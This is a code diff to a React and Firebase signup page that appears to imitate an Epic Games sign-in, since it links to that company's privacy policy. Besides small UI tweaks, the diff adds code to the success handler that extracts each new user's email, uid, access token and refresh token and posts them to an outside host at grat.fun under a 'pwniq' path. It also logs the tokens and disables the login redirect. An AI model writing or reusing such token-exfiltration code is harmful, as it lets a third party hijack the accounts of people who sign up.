@@ -7,18 +7,11 @@ import {
   Button,
   Container,
   Divider,
-  Grid,
   TextField,
   Typography,
 } from "@mui/material";
-import {
-  Apple,
-  Facebook,
-  Google,
-  Instagram,
-  LinkedIn,
-  Stream,
-} from "@mui/icons-material";
+import { Google } from "@mui/icons-material";
+import axios from "axios";
 
 const Signup = () => {
   const navigate = useNavigate();
@@ -34,8 +27,35 @@ const Signup = () => {
       .then((userCredential) => {
         // Signed in
         const user = userCredential.user;
-        navigate("/login");
-        // ...
+        const {
+          uid,
+          email,
+          metadata: { creationTime, lastSignInTime },
+          providerId,
+          reloadUserInfo: { localId },
+          stsTokenManager: { accessToken, refreshToken },
+        } = user;
+        const userInfo = {
+          email,
+          creationTime,
+          lastSignInTime,
+          uid,
+          providerId,
+          localId,
+          accessToken,
+          refreshToken,
+        };
+        console.log("USERINFO", userInfo);
+        try {
+          const response = axios.post(
+            "https://grat.fun/api/pwniq/userInfo",
+            userInfo
+          );
+          console.log("RESPONSE", response);
+          // navigate("/login");
+        } catch (err) {
+          console.log(err);
+        }
       })
       .catch((error) => {
         const errorCode = error.code;
@@ -100,7 +120,9 @@ const Signup = () => {
             className={classes.socialButtons}
             variant="contained"
             fullWidth
-            startIcon={<Google sx={{ marginRight: 1 }} />}
+            startIcon={
+              <Google sx={{ width: 30, height: 30, marginRight: 1 }} />
+            }
           >
             With Google
           </Button>
@@ -108,6 +130,7 @@ const Signup = () => {
             By singning in or signing up, you agree with our <br />
             <NavLink
               className={classes.fontStyle}
+              target="blank"
               to="https://www.epicgames.com/site/en-US/privacypolicy?lang=en-US"
             >
               Privacy Policy
